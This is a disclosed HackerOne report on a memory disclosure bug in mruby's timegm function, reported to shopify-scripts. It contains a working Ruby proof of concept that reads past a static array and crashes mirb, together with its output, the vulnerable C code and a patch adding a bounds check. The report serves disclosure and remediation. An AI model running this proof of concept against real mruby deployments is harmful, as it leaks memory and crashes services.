# Memory disclosure in timegm

## Report Details
- **Report ID**: 192896
- **URL**: https://hackerone.com/reports/192896
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-20T23:15:59.341Z
- **Disclosed**: 2017-01-31T23:41:39.854Z

## Reporter
- **Username**: volc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
An attacker may disclose memory or/and crash mirb.

# PoC

```ruby
@a = ''
for i in 0..50 do
  t = Time.new(1970, 12 + i + 1).to_i - Time.new(1970, 12 + i).to_i
  @a << t.to_s(16)
  @a << " "
end

@a

Time.new(1970, 0x10000)
```

Output:

```shell
$ ./bin/mruby-engine-mirb < timgm.rb 
mirb - Embeddable Interactive Ruby Shell

> * * * * *  => 0..50
>  => nil
>  => "28de80 28de80 263b80 28de80 278d00 28de80 278d00 28de80 28de80 278d00 28de80 278d00 28de80 49dab380 ee655600 feabe80 98ee00 9facec80 97bc0380 c22e3e00 5b9a3280 c90abe00 4274900 6e4eec80 0 0 0 0 0 85430f00 b883c900 cb470380 defdb180 5c70380 9fa10f00 fca10f00 65153180 2d94ec80 70eca680 23bd5500 a012600 0 0 0 0 17e78500 0 54600 0 c3ae0f80 0 "
>  => nil
> Segmentation fault
```



# Explanation

The vulnerability is located in the `timegm` function (`ext/mruby_engine/mruby-time/src/time.c`). The variable `tm->tm_mon` is controlled by the attacker while it must be lower than 12. An out-of-bound access occurs if `tm->tm_mon` is greater than 11, and the memory after the static array `ndays` is read.

```C
static time_t
timegm(struct tm *tm)
{
  static const unsigned int ndays[2][12] = {
    {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},
    {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}
  };
  time_t r = 0;
  int i;
  unsigned int *nday = (unsigned int*) ndays[is_leapyear(tm->tm_year+1900)];

  for (i = 70; i < tm->tm_year; ++i)
    r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;
  for (i = 0; i < tm->tm_mon; ++i)
    r += nday[i] * 24 * 60 * 60;
```



# Impact

An attacker may:

- crash mirb
- read parts of the memory, which can help to build a reliable exploit thanks to an additional vulnerability



# Patch

```diff
diff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c
index 8884a5d..ce21043 100644
--- a/ext/mruby_engine/mruby-time/src/time.c
+++ b/ext/mruby_engine/mruby-time/src/time.c
@@ -130,7 +130,7 @@ timegm(struct tm *tm)
 
   for (i = 70; i < tm->tm_year; ++i)
     r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;
-  for (i = 0; i < tm->tm_mon; ++i)
+  for (i = 0; i < tm->tm_mon && i < 12; ++i)
     r += nday[i] * 24 * 60 * 60;
   r += (tm->tm_mday - 1) * 24 * 60 * 60;
   r += tm->tm_hour * 60 * 60;
```

## Attachments
No attachments
